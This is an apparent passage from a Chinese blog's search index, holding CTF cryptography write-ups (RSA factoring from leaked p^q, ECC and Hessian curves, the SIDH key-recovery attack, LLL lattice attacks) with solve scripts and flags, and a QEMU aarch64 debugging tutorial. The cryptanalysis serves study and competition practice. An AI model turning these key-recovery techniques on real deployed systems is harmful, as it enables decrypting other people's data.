\u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;1\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) elif((mask1[l] == \u0026#34;0\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;1\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) elif((mask1[l] == \u0026#34;0\u0026#34; and h1[l] == \u0026#34;0\u0026#34;) and (mask2[l] == \u0026#34;0\u0026#34; and h2[l] == \u0026#34;0\u0026#34;)): find(p+\u0026#34;0\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;0\u0026#34;,q+\u0026#34;1\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;0\u0026#34;) find(p+\u0026#34;1\u0026#34;,q+\u0026#34;1\u0026#34;) tempp = \u0026#34;\u0026#34; tempq = \u0026#34;\u0026#34; #find(tempp,tempq) P = 10172774442863868719013872884099170294615753094066736187886125116462340120031133533430755779832487215255546434139069419394249074006281284289077492708469893 Q = 8580050824978592226795441601299432164577158891190171233964440597982925469924083252289609500726234367555160732119333211934059529993446003001925910065317613 phi = (P-1)*(Q-1) d = inverse(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) hint = sqrt(p) ^ sqrt(q) # hint = sqrt(p) ^ sqrt(q)\nhttps://tangcuxiaojikuai.xyz/post/795314c1.html\np*q、p^q 2 # 所以根据这个爆破一下p和q,n是4096位，p^q是2047位乘2是4094位显然p和q的最高位都是1异或值是0\nn = 568511...... e = 65537 p_xor_q = 14888341604... def getpq(p,q, i): if p*q \u0026gt; n: #print(\u0026#39;A\u0026#39;, i) return tail = (1\u0026lt;\u0026lt;i)-1 #后i位置1 if (p|tail)*(q|tail) \u0026lt; n: #print(\u0026#39;B:\u0026#39;, i, hex(p|tail), hex(q|tail)) return if p*q == n: print(\u0026#39;p=\u0026#39;,p) print(\u0026#39;q=\u0026#39;,q) return i -= 1 if p_xor_q \u0026amp; (1\u0026lt;\u0026lt;i) == 0: getpq(p^(1\u0026lt;\u0026lt;i), q^(1\u0026lt;\u0026lt;i), i) getpq(p,q,i) else: getpq(p^(1\u0026lt;\u0026lt;i), q, i) getpq(p,q^(1\u0026lt;\u0026lt;i),i) print(n.bit_length(), p_xor_q.bit_length()) #4096 2047 import sys sys.setrecursionlimit(3000) getpq(3\u0026lt;\u0026lt;2046,1\u0026lt;\u0026lt;2047, 2046) ","date":"4 November 2023","permalink":"/articles/rsaallintwo/","section":"Projects","summary":"rsa all in two # leak (p^q)\u0026raquo;nbits # from Crypto.","title":"rsa all in two"},{"content":"","date":"4 November 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"\r10月小结 # github号被封了，抑郁了。被阿美莉卡狠狠卡脖子了\n图床全线崩溃\n求求你给我解封了吧\n求求你了求求你了（塔菲求饶.jpg）\n华子杯 # next-prime-task # 生成机组数据发现对N直接开方得到可以得到p或q的近似值pd\n多次测试后发现这个pd和p绝对值的差不会大于1000于是对pd减去1000后爆破得到p1 nextprime得到p2\n抽象\u0026hellip;\nfrom Crypto.Util.number import * from gmpy2 import next_prime, iroot from flag import flag assert flag[0:4]==b\u0026#39;flag\u0026#39; m = bytes_to_long(flag) assert size(m)\u0026lt;500 p = getPrime(512) q = next_prime(p) n = p * q print(\u0026#39;n=\u0026#39;, n\u0026gt;\u0026gt;520) e = 0x10001 c = pow(m, e, n) print(\u0026#39;c=\u0026#39;, c) \u0026#39;\u0026#39;\u0026#39; n= 28576274811010794362153160897556935178530640825011441539841241257190782139295561904323347128956873569754645071205043238985141474388531008367238218822591 c= 49502875285578675438052554215266678403659290915102322948363030271494959804587081871467110614683972929037615883922743651431683465100061968204901334627149795829429950385848753728500177164800064208215503246868631076011505268371936586645321659884527055007299822625570713613996139223348709621258028349513737798120 \u0026#39;\u0026#39;\u0026#39; from Crypto.Util.number import * from gmpy2 import * # n= 16212823795921249015201513720149784272087058934998256111313253824205027920859214121063981513487904645940216957428441144762656821271607914704124385625054 # c= 42623448757142425965793058163308735025128962287288212456406034320792801149338160716972860425304842585118914774556604523599336877170146028573856917845178178543459331490175081849764083076168568374304256040399932392040329806010797252107241692940719624357821612728032794873653073208064739506588169944780568217733 e = 0x10001 n= 28576274811010794362153160897556935178530640825011441539841241257190782139295561904323347128956873569754645071205043238985141474388531008367238218822591 c= 49502875285578675438052554215266678403659290915102322948363030271494959804587081871467110614683972929037615883922743651431683465100061968204901334627149795829429950385848753728500177164800064208215503246868631076011505268371936586645321659884527055007299822625570713613996139223348709621258028349513737798120 N = n\u0026lt;\u0026lt;520 pd = iroot(N,2)[0] p1 = pd -10000 for i in range(1000): p1 = next_prime(p1) p2 = next_prime(p1) tmp = (p1*p2)\u0026gt;\u0026gt;520 if(tmp == n): print(tmp - n) print(i) n1 = p1*p2 phi = (p1-1)*(p2-1) d = inverse(e,phi) m1 = pow(c,d,n1) print(long_to_bytes(m1)) EC_Party-I-chall # 狠活\nhitcon2022 Chimera\n将order的一个小因子除掉再乘以E(C)，可能会产生kp mod n的情况，这会让sagemath报错，我们得以看到kp的值：\n试试脚本\nge/structure/element.c:15686)\rFile \u0026#34;/usr/lib/python3/dist-packages/sage/schemes/elliptic_curves/ell_point.py\u0026#34;, line 679, in _add_\rraise ZeroDivisionError(\u0026#34;Inverse of %s does not exist (characteristic = %s = %s*%s)\u0026#34; % (x1-x2, N, N1, N2))\rZeroDivisionError: Inverse of 399142328555769122684976351600136585680104999923110415867753480206443969280985877697850841401824368944437043138064030332535786936031074694422398245233538680969600520572361311820112559527089421156024161654714350513598626449030622660 does not exist (characteristic = 762981334990685089884160169295988791471426441106522959345412318178660817286272606245181160960267776171409174142433857335352402619564485470678152764621235882232914864951345067231483720755544188962798600739631026707678945887174897543 = 37474009785980474658135106783131904659818035950984079581009709986840194575036321428945132957079423328996508289872067*20360280080732821723376422808980005582531004028308560803397168572148594993701208369640640375361387495696068328462829) 嚯嚯 好家伙，还真有 kp mod n的情况，太震撼了\ngcd一下就有\ndq = inverse_mod(2,oq) 可以直接算dq\ndp和2互素了 我愿意称之为ecc rabin 构建公式\n$$ f = (3x^2+a)^2-2x(4(x^3+ax+b))-C[0]4(x^3+ax+b) $$\n只看出来是个对x求偏导后的式子，没看懂为啥这样，摆了\n偷个脚本\nfrom Crypto.Util.number import * a,b,n,C = 138681122158674534796479818810828100269024674330030901179877002756402543027343312824423418859769980312713625658733, 4989541340743108588577899263469059346332852532421276369038720203527706762720292559751463880310075002363945271507040, 762981334990685089884160169295988791471426441106522959345412318178660817286272606245181160960267776171409174142433857335352402619564485470678152764621235882232914864951345067231483720755544188962798600739631026707678945887174897543, (19591102741441427006422487362547101973286873135330241799412389205281057650306427438686318050682578531286702107543065985988634367524715153650482199099194389191525898366546842016339136884277515665890331906261550080128989942048438965, 728465071542637655949094554469510039681717865811604984652385614821789556549826602178972137405550902004858456181137844771163710123158955524137202319902378503104952106036911634918189377295743976966073577013775200078470659428344462772) E = EllipticCurve(Zmod(n),[a,b]) C = E(C) order = 762981334990685089884160169295988791471426441106522959345445792076415993922016249232021560266153453470937452118572318136597282436269660557904217923887981072203978473274822142705255987334355747997513083011853917049784914749699536828 # fac ord_p*ord_q # o = order // 8452217 # print(C*o) # for i in range(1,10000): # tt = (order//i)*C # 399142328555769122684976351600136585680104999923110415867753480206443969280985877697850841401824368944437043138064030332535786936031074694422398245233538680969600520572361311820112559527089421156024161654714350513598626449030622660 # p = GCD(n,kp) p = 37474009785980474658135106783131904659818035950984079581009709986840194575036321428945132957079423328996508289872067 q = n//p assert p*q == n Ep = EllipticCurve(Zmod(p),[a,b]) Eq = EllipticCurve(Zmod(q),[a,b]) #print(Ep.order()) #print(Eq.order()) op = 37474009785980474658135106783131904659818035950984079581012533947688268013671227793391417023914911897089093262951596 oq = order // op dq = inverse_mod(2,oq) mq = dq*Eq(C) print(Ep(C)) R.\u0026lt;x\u0026gt; = PolynomialRing(GF(p)) f = (3*x^2+a)^2-2*x*(4*(x^3+a*x+b))-C[0]*4*(x^3+a*x+b) for i in (f.roots()): print(long_to_bytes(crt([int(i[0]),int(mq[0])],[p,q]))) print(\u0026#39;done\u0026#39;) # 3crab1n_s0unds_go0d 香山杯 lift # import os import gmpy2 from Crypto.Util.number import * import random from secrets import flag def pad(s,l): return s + os.urandom(l - len(s)) def gen(): g = getPrime(8) while True: p = g * random.getrandbits(138) + 1 if isPrime(p): break while True: q = g * random.getrandbits(138) + 1 if isPrime(q): break N = p ** 5 * q phi = p ** 4 * (p - 1) * (q - 1) d = random.getrandbits(256) e = inverse(d, phi) E = e * g hint = gmpy2.gcd(E, phi) return N, E, hint flag = pad(flag,64) m = bytes_to_long(flag) n,e,hint = gen() c = pow(m,e,n) print(f\u0026#39;hint = {hint}\u0026#39;) print(f\u0026#39;n = {n}\u0026#39;) print(f\u0026#39;e = {e}\u0026#39;) print(f\u0026#39;c = {c}\u0026#39;) hint = 251 n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077 e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039 c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162 因为\n$$ \\phi(n)=p^4*(r_1 r_2g^2)=0(\\ mod \\ p^4) $$\n所以\n$$ ed-1=k\\phi(n)=0 mod \\ p^4 $$\n此时256大小的d就可以用small root求出来了\n求得p和q后，因为e和phi（p）phi（q）\n不互素，这里的情况和*CTF 2021 little case 类似，decrypt2处理\n$$ phip = p ^ 4 * (p - 1) $$\n一开始没想通，但其实和decrypt里面是一样的\n用AMM应该也可以解\nexp\nfrom Crypto.Util.number import * import itertools hint = 251 n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077 e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039 c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162 e //= hint RP.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = e*x -1 f = f.monic() x0 = f.small_roots(X = 2^256,beta = 0.4) print(x0) x0 = 39217838246811431279243531729119914044224429322696785472959081158748864949269 p4 = GCD(x0*e-1,n) # 23153425300889483483553551112335873301449089474555179592930187730428387181422112282990079197590872977617830286073037301064978277511828551780538222539198674709759058026997715121 # print(gmpy2.iroot(int(p4),int(4))) # (mpz(69367143733862710652791985332025152581988181), True) p = 69367143733862710652791985332025152581988181 q = n // p ^ 5 phi = p ^ 4 * (p - 1) * (q - 1) d= inverse(e,phi) # 39217838246811431279243531729119914044224429322696785472959081158748864949269 cp = c % p^5 cq = c % q e = e*hint def decrypt2(p,c,e): phip = p ^ 4 * (p - 1) w = GCD(e,phip) p1 = phip // w b = inverse(e,p1) g = get_oneroot2(p,w) m = pow(c,b,p^5) mps = [ZZ(m*g^i) for i in range(w)] return mps def get_oneroot2(p,w): while 1: Zp = Zmod(p^5) g = Zp.random_element() g = g^(p^4*(p-1)//w) for i in divisors(w): if(i != w): g2 = g^i if(g2 ==1): break else: # break return g mps = decrypt2(p,cp,e) def get_oneroot(p,w): while 1: Zp = Zmod(p) g = Zp.random_element() g = g^((p-1)//w) for i in divisors(w): if(i != w): g2 = g^i if(g2 ==1): break else: return g def decrypt(p,c,e): phip = p-1 w = GCD(e,phip) p1 = phip//w b = inverse(e,p1) g = get_oneroot(p,w) m = pow(c,b,p) return [ZZ(m*g^i) for i in range(w)] mqs = decrypt(q,cq,e) for mp, mq in itertools.product(mps, mqs): m = crt([mp, mq], [p^5, q]) msg = long_to_bytes(int(m)) if (b\u0026#39;flag\u0026#39; in msg): print(msg) 安卓动态调试 # jeb-demo-4.16.0\n照着看雪的教程改一下就能跑\n机器：oneplus7T\nOS：lineageOS\n调了两个没混淆的题，没什么意思，github图床炸了，不放图了\n","date":"21 September 2023","permalink":"/articles/10month/","section":"Projects","summary":"10月小结 # github号被封了，抑郁了。被阿美莉卡狠狠卡脖子了","title":"10月小结"},{"content":"","date":"21 September 2023","permalink":"/categories/ctf/","section":"Categories","summary":"","title":"CTF"},{"content":"\rhttps://github.com/ljahum/crypto-challenges/tree/main/2023/cryptoCTF2023\nBarak # 椭圆曲线狠活\nHessian Curve\n$$ x^3 + y^3 +c - Dxy =0 \\ (mod \\ p) $$\n先检查是什么曲线\nhttps://www.hyperelliptic.org/EFD/\nHessian curves: x3+y3+1=3*d*x*y 所以理論上可以找 paper 看看有沒有寫轉回 Weierstrass form 的公式\n常规ECC曲线\rShort Weierstrass curves: y2=x3+a*x+b EllipticCurve_from_cubic # 可以用 sage 內建的 EllipticCurve_from_cubic 來做\n但这个函数只能接受a homogeneous cubic in three variables with rational coefficients 才行。\n所以我们要先建立一个又三参数的cubic式子，然后利用投影的方法\n将其变换到只需要x y也能够找到点的形式\n先增加一个Z参数然后利用在考数一之前学习的体积分的技巧，\r将 F(x,y,z)映射到Fz(x,y) 计算表达式 $$ (X\u0026rsquo;,Y\u0026rsquo;,Z\u0026rsquo;) $$\n用偏微分的表达式计算投影方程x和y的表达式\n令z=1\n$$ x = x\u0026rsquo;/z\u0026rsquo; \\\\ y = x\u0026rsquo;/z\u0026rsquo; \\\\ z = 1 \\\\ z\u0026rsquo;/z\u0026rsquo; = 1 $$\nfrom Crypto.Util.number import long_to_bytes p = 73997272456239171124655017039956026551127725934222347 d = 68212800478915688445169020404812347140341674954375635 c = 1 F = GF(p) x, y, z = QQ[\u0026#34;x,y,z\u0026#34;].gens() eq = x ^ 3 + y ^ 3 + c * z ^ 3 - d * x * y * z phi = EllipticCurve_from_cubic(eq) E = phi.codomain().change_ring(GF(p)) P = ( 71451574057642615329217496196104648829170714086074852, 69505051165402823276701818777271117086632959198597714, ) Q = ( 40867727924496334272422180051448163594354522440089644, 56052452825146620306694006054673427761687498088402245, ) fx, fy, fz = map(lambda f: f.change_ring(F), phi.defining_polynomials()) // 设置x y z 进去函数后的运算方法 phiP = lambda x, y, z=1: E(fx(x, y, z) / fz(x, y, z), fy(x, y, z) / fz(x, y, z)) EP = phiP(*P) EQ = phiP(*Q) x = discrete_log(EQ, EP, operation=\u0026#34;+\u0026#34;) print(x) od = EP.order() # the generator doesn\u0026#39;t have full order print( [ flag for i in range(E.order() // od) if (flag := long_to_bytes(int(x + od * i))).isascii() ] ) # CCTF{_hE5S!4n_f0rM_0F_3CC!!} 通式 # $$ D = d3 \\\\ a = -27D(D^3 + 8) \\\\ b = 54(D^6 - 20D^3 - 8) \\\\ $$\np = 73997272456239171124655017039956026551127725934222347 G = GF(p) d = G(68212800478915688445169020404812347140341674954375635) D = d/3 c = 1 # Hessian Curve: # x³ + y³ + 1 = 3Dxy # Weierstrass equivalent a = -27*D*(D^3 + 8) b = 54*(D^6 - 20*D^3 - 8) E2 = EllipticCurve(G, [a, b]) print(E2) # Elliptic Curve defined by y^2 = x^3 + 44905983883632632311912975168565494049729462391119290*x + 4053170785171018449128623853386306889464200866918538 over Finite Field of size 73997272456239171124655017039956026551127725934222347 order = E2.order() # 73997272456239171124655016995459084401465136460086688 Keymoted # p 和 q有两个bit不一样，但位置已知，而且是flip的关系\n逻辑\nP-\u0026gt;|flip两个bit|-\u0026gt;S-\u0026gt;|next pri|-\u0026gt;Q 弯弯爷的思路\n由于nbit - 1位置一定是1，flip相当于减去 $$ nbit-1=a\\ 2^{nbit-1}=2^a $$\n中间变量 $$ p\u0026rsquo; = p-2^a $$\n可以有灯饰 $$ p =p\u0026rsquo;+2^a\\ p =p\u0026rsquo;\\plusmn 2^a\\ q = 2s+t+1\\ $$ 1+t很小，爆一下就是解方程了\nsage\nfrom Crypto.Util.number import long_to_bytes pkey = ( 6660938713055850877314255610895820875305739186102790477966786501810416821294442374977193379731704125177528590285016474818841859956990486067573436301232301, 65537, 5539256645640498184116966196249666621079506508209770360679460869295427007578, 20151017657582479433586370393795140515103572865771721775868586710594524816458, ) encx = 6641320679869421443758875467781930795132746694454926965779628505713445486895274490835545942727970688359873955019634877304270220728625521646208912044469433 ency = 2856872654927815636828860866843721158889474116106462420201092148493803550131351543372740950198853438539317164093538508795630146854596724019329887894933972 n, e, a, b = pkey nbit = 256 pp = ZZ[\u0026#34;pp\u0026#34;].gen() p = 2 ** (nbit - 1) + pp s = pp + 2 ** (nbit // 2) # guess for t in range(1000): q = 2 * s + 1 + t f = p * q - n rs = f.roots() if rs: print(t, rs) break p = 2 ** (nbit - 1) + rs[0][0] q = n // p assert p * q == n Z = Zmod(n) E = EllipticCurve(Z, [a, b]) C = E(encx, ency) Ep = EllipticCurve(GF(p), [a, b]) Eq = EllipticCurve(GF(q), [a, b]) od = Ep.order() * Eq.order() d = pow(e, -1, od) M = d * C print(long_to_bytes(int(M.xy()[0]))) Z3\npkey = (6660938713055850877314255610895820875305739186102790477966786501810416821294442374977193379731704125177528590285016474818841859956990486067573436301232301, 65537, 5539256645640498184116966196249666621079506508209770360679460869295427007578, 20151017657582479433586370393795140515103572865771721775868586710594524816458) enc = (6641320679869421443758875467781930795132746694454926965779628505713445486895274490835545942727970688359873955019634877304270220728625521646208912044469433,2856872654927815636828860866843721158889474116106462420201092148493803550131351543372740950198853438539317164093538508795630146854596724019329887894933972,1) nbit = 256 n,e,a,b = pkey from z3 import * k1 = 2 ** (nbit - 1) k2 = 2 ** (nbit // 2) for i in range(0,2000,2): print(i) s= Solver() p = BitVec(\u0026#39;p\u0026#39;, 256) q = 2*(p+k1+k2)+1+i #4种情况 第1种情况i=2有解 s.add(p*q == n) if s.check() == sat: tp = s.model()[p].as_long() if n%tp == 0: print(tp) p = 93511613846272978051774379195449772332692693333173612296021789501865098047641 q = 71231138455229760679977773382211636812795966734548537479512744210680602878261 ASIv1 # 三进制好活\n记一下 别忘了GF(p)矩阵的传统手艺\nfrom output import * MR = matrix(GF(3), R) MS = matrix(GF(3),12100,1, S) a = MR.solve_right(MS) flag = \u0026#39;\u0026#39;.join([str(a[i,0]) for i in range(110)]) #\u0026#39;12200101122112210002110212001112001011210012200110200221111110001002012120200110211202001221221020201121010111\u0026#39; bytes.fromhex(hex(int(flag,3))[2:]) b\u0026#39;3Xpl0i7eD_bY_AtT4ck3r!\u0026#39; #CCTF{3Xpl0i7eD_bY_AtT4ck3r!} 求ecc上的Q/2 # 没有设置 gf(P)就无所谓什么离散性了\n# y^2 = x^3 - 76479349401*x # Q = (2740238460026645848168554718863025/9496587522097110856052646144 : -40938233945632940227696869615241088990456963438185/925446596757862314622073825244539026870272 : 1) E = EllipticCurve(QQ, [-76479349401, 0]) Q = E( 2740238460026645848168554718863025 / 9496587522097110856052646144, -40938233945632940227696869615241088990456963438185 / 925446596757862314622073825244539026870272, ) for x in Q.division_points(2): print(\u0026#34;,\u0026#34;.join(map(str, x.xy()))) # CCTF{H4lVin9_pO!ntS_0n_3lLipT1C_cuRve5!} An efficient key recovery attack on SIDH # Supersingular Isogeny Diffie-Hellman protocol (SIDH)\n这是什么？不知道\n打就完事了\n特征参数\n$$ y^2=x^3+x\\ y^2=x^3+6x^2+x\\ $$\na, b = gen_param(190) p = 2**a * 3**b - 1 F.\u0026lt;x\u0026gt; = GF(p^2, modulus = x**2 + 1) EC = EllipticCurve(F, [0, 6, 0, 1, 0]) P, Q, R, S = gen_tpt(EC, a, b) print(f\u0026#39;P = {P.xy()}\u0026#39;) print(f\u0026#39;Q = {Q.xy()}\u0026#39;) print(f\u0026#39;R = {R.xy()}\u0026#39;) print(f\u0026#39;S = {S.xy()}\u0026#39;) skey, _phi_dom, _phi_P, _phi_Q = keygen(EC, b, P, Q, R, S) 22年的狠活\nexamlp:\nhttps://github.com/GiacomoPope/Castryck-Decru-SageMath/blob/main/baby_SIDH.sage\nexamlp\nfrom Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES from hashlib import md5 from public_values_aux import generate_distortion_map load(\u0026#34;./castryck_decru_shortcut.sage\u0026#34;) x = QQ[\u0026#34;x\u0026#34;].gen() P = ( 3799366067639160994711391413511701264777392349807255916259320256251336249666 * x + 633884628131689177031068067897867565283026098415356709331881575255526844055, 3967348484864888240941807454988077684669074109524399477973520952727771366997 * x + 2712354532382043232096058211997452093712477916671679907467703464009558475387, ) Q = ( 560486392227142181240528415381730657098132581407794833013161975335122628946 * x + 3215971074127995409351672272900519761566156375365764079386358523254177565572, 2231746347912007096335360835242707156884468521076802738444724241125548841199 * x + 1147378568798166954853288670809304301194478550602719730593160186622788033023, ) R = ( 2656280316115888204975052029900945854050191685154131031859911335618240136443 * x + 1127449111197960889758916770042950976852995868310602942974825430779982061546, 3477289737920472771668877366806058236254602770820629911886593813749930497839 * x + 4646016633241840360901490323351236375375727836768954121794139000985805816564, ) S = ( 2403139149412141532587482679318245468078604585804423116505024414375742701912 * x + 2772488504607240668919423445309052101443116827322741849326656561794480962717, 3356599382898540527962106232860239304405841217130774924490318752448476310798 * x + 2818004736373436361527915593539097434287090434842750370886675729711731978922, ) # def eq(x, y): # return y^2 -(x^3+6*x^2+1*x) # eqs = [eq(*P) for P in (P, Q, R, S)] # pmul = gcd(eqs[0].resultant(eqs[1]), eqs[2].resultant(eqs[3])) # print(factor(pmul)) p = 4651852759096127491733667803074539573102288457512521355046899661762757394431 a = valuation(p + 1, 2) b = valuation(p + 1, 3) F = GF(p ^ 2, \u0026#34;a\u0026#34;, modulus=x ^ 2 + 1) E_start = EllipticCurve(F, [0, 6, 0, 1, 0]) E_start.set_order((p + 1) ^ 2) P, Q, R, S = [E_start(P) for P in (P, Q, R, S)] a2 = 6 a4 = ( 2070374075904221348548347954672740119972290047985052548426161483408084160515 * x + 896749506444795652787374405713981306103783874504413776724865996633074195878 ) a6 = ( 2497300913991521538985990865799426081199023429830552981773916386651958830387 * x + 4243320791854592301388975795466391442631117041175807728844738724691845270777 ) E_end = EllipticCurve(F, [0, a2, 0, a4, a6]) E_end.set_order((p + 1) ^ 2) _phi_P = ( 76437828586489590038329193939006186966443918785230388533883401536928551274 * x + 1854701339851606878866613257086348330205980107370562791121360193846610915298, 3614996124089236146025194675467338095830005859290616536023140003816221458491 * x + 1308394538776387115295908857102539180825411698539070801598965381200026966383, ) _phi_Q = ( 2350346337927935568113772636838467488287314266120334638991371449749383548230 * x + 3389994457403704259291228848441313337916860864318549296438418403582347527289, 3514523396038039657181009561828298688334341559779027220238590888980836781356 * x + 1132784636339236588815425424619354807485262558088269015122405460656452137103, ) phi_P, phi_Q = [E_end(P) for P in (_phi_P, _phi_Q)] P2 = P Q2 = Q P3 = R Q3 = S two_i = generate_distortion_map(E_start) skey = CastryckDecruAttack(E_start, P, Q, E_end, phi_P, phi_Q, two_i, 4) ct = bytes.fromhex( \u0026#34;50d8ed352ccf3ce6d64b25e50ed67b832dcbcd94dcb7dc8293e813e0c83ace541abb61618d5f971ff5d24fab8a2e\u0026#34; ) key = md5(long_to_bytes(skey)).digest() iv = md5(str(skey).encode()).digest() cipher = AES.new(key, AES.MODE_CFB, iv=iv) flag = cipher.decrypt(ct) print(flag) # CCTF{3FfiC!En7_k3Y_R3c0vErY_4tTacK_ON_SIDH!!!} ECDSA LLL attack # https://blog.maple3142.net/2023/07/09/cryptoctf-2023-writeups/#marjan\n","date":"21 September 2023","permalink":"/articles/cryptoctf2023note/","section":"Projects","summary":"https://github.","title":"notes of CryptoCTF 2023 "},{"content":"\r两个格密码相关的狠活 # https://eprint.iacr.org/2021/1007\n强网杯 2022 Lattice # 逻辑\n$$ C = A \\sdot B \\ \\ (mod \\ n) $$\n$$ B \\to LLL \\to L_x $$\n已知C求Lx\n构造A矩阵\nI 是单位矩阵\nA = matrix(ZZ,m+r,m+r) for i in range(m): A[i,i] = 1 for i in range(r): for j in range(m): A[j,i+m] = C[i,j]\u0026lt;\u0026lt;200 A[i+m,i+m] = N\u0026lt;\u0026lt;200 $$ A \\to LLL \\to S $$\n满足\nS*A得到最得到短基\n此时有\n$$ B\u0026rsquo; \\sdot C^t+K\\sdot N=0 $$\n得到的B’如下操作得到 Lx\ngraph LR\rB --\u0026gt;|LLL| Lx\rB\u0026#39; --\u0026gt;|kernel_LLL or right_kernel.basis| Lx 巅峰极客2022 # 狠活https://crypto.stackexchange.com/a/70508\n逻辑\n已知Q求m，说实话，太逆天了。。。。只记录步骤\n可以理解为想办法构造一个格子，让它的规约后得到的最短基组的第一列刚好为m 所以上文才要转置吗23333\n主要思想是先找Q = D*G\ndi是生成元G与Qi的离散对数解\n然后找一个矩阵R使得\nR的计算\n构造\n左上得到R\n由于有\n（这也能解？）\n所以M的每一列是矩阵R的右核解，我们要求的M的第一列是R的右核格上。\n格基规约后的每行正交性是不变的。且M的第一列是短向量，期望对R求右核矩阵然后规约即可还原出M的第一列。（没看懂）\nM=Matrix(ZZ,74,74) for i in range(73): M[i,i]=1 M[i,-1]=D[i] M[-1,-1]=p R=M.LLL() LK=[] # 这是在取结果的右核吗？ for i in R: if i[-1]!=0: break else: LK.append(i[:-1]) print(len(LK)) # 用R的右核解M LK=Matrix(ZZ,LK) key=Matrix(ZZ,LK.right_kernel().basis()).LLL()[0] for i in key: print(chr(long_to_bytes(ZZ(i))[-1]),end=\u0026#39;\u0026#39;) https://github.com/ljahum/crypto-challenges/tree/main/2023/2023/LLLstudy\n","date":"21 September 2023","permalink":"/articles/lllstudy2023/","section":"Projects","summary":"","title":"2 examples of CTF LLL crypto in 2023"},{"content":"","date":"9 August 2023","permalink":"/tags/bin/","section":"Tags","summary":"","title":"bin"},{"content":" 算是了却了大二入门kernel pwn未果的心结\nUbuntu 20 qume7.2.4 源码安装qemu # apt intsall版本太低\nhttps://www.qemu.org/download/\nwget https://download.qemu.org/qemu-7.2.4.tar.xz tar xvJf qemu-7.2.4.tar.xz cd qemu-7.2.4 ./configure sudo make -j8 # 多核编译 sudo make insatll 中间缺什么apt直接装就是\nmake install 可能会环境变量添加失败，无所谓，直接如下运行\nsudo /usr/local/test/bin/qemu-aarch64 安装mips amd64所需的libc（瞎装一通）\n在/user下应该能找到交叉编译所需要的库\nqemu\nljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/ aarch64-linux-gnu/ include/ lib64/ local/ sbin/ bin/ lib/ libexec/ mipsel-linux-gnu/ share/ games/ lib32/ libx32/ mips-linux-gnu/ src/ ljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/aarch64-linux-gnu/ bin/ include/ lib/ ljahum@ljahum-vm ~/D/test\u0026gt; 编译运行 # 写个玩具\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ printf(\u0026#34;hello world\\ninput ur emotion\\n\u0026#34;); char str[200]; scanf(\u0026#34;%s\u0026#34;,str); printf(\u0026#34;u say : %s\\n\u0026#34;,str); if(!strcmp(str,\u0026#34;hello\u0026#34;)){ printf(\u0026#34;you good\\n\u0026#34;); } else if(!strcmp(str , \u0026#34;end\u0026#34;)){ printf(\u0026#34;you bad\\n\u0026#34;); } // printf(\u0026#34;end\\n\u0026#34;); return 0; } aarch64-linux-gnu-gcc ./main.c -o amd64out -static\n运行\nljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/aarch64-linux-gnu/ bin/ include/ lib/ ljahum@ljahum-vm ~/D/test\u0026gt; qemu-aarch64 amd64out hello world input ur emotion hello u say : hello you good ljahum@ljahum-vm ~/D/test\u0026gt; file amd64out amd64out: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=84b60fe12f86c039ffcd221a4e32a1c766677293, for GNU/Linux 3.7.0, not stripped ljahum@ljahum-vm ~/D/test\u0026gt; qemu用户模式调试 # 先安装gdb-multiarch\nsudo apt install gdb-multiarch\nqemu启动脚本\n-L 指定动态连接库位置 此时用于是静态链接 所以可加可不加\n-g指定 挂载端口\nqemurun.sh\n#!/bin/bash sudo /usr/local/test/bin/qemu-aarch64 \\ -L /usr/aarch64-linux-gnu/ \\ -g 1234 \\ ./amd64out gdb启动脚本\ngdbrun.sh\n#!/bin/bash gdb-multiarch -q ./amd64out -x dbgscript gdb-multiarch 行内命令脚本\ndbgscript:\n#dbgscript set architecture aarch64 b main target remote 127.0.0.1:1234 c 先运行qemu启动脚本\nljahum@ljahum-vm ~/D/test\u0026gt; sudo ./qemurun.sh hello world input ur emotion end u say : end 再运行gdb启动脚本\nljahum@ljahum-vm ~/D/test\u0026gt; sudo ./gdbrun.sh pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list. pwndbg: created $rebase, $ida GDB functions (can be used with print/break) Reading symbols from ./amd64out... (No debugging symbols found in ./amd64out) The target architecture is assumed to be aarch64 Breakpoint 1 at 0x928 warning: remote target does not support file transfer, attempting to access files from local filesystem. 0x0000005502814100 in ?? () from /lib/ld-linux-aarch64.so.1 warning: Could not load shared library symbols for /lib/libc.so.6. Do you need \u0026#34;set solib-search-path\u0026#34; or \u0026#34;set 